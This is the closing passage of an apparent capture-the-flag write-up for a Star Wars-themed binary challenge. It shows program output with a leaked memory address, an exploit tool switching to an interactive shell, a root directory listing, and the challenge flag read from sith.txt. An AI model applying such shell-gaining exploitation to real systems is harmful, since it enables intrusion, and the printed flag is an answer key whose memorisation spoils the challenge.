.'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n\n When I left you, I was but the learner. Now I am the master >>>"
0x7fd4b0b46de0
[*] Switching to interactive mode
 $ ls
-
banner_fail
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
service.conf
sith.txt
srv
sys
tmp
usr
vader
var
wrapper
$ cat sith.txt
shctf{W1th0ut-str1f3-ur-v1ctory-has-no-m3an1ng}
$
```
Thanks for reading!
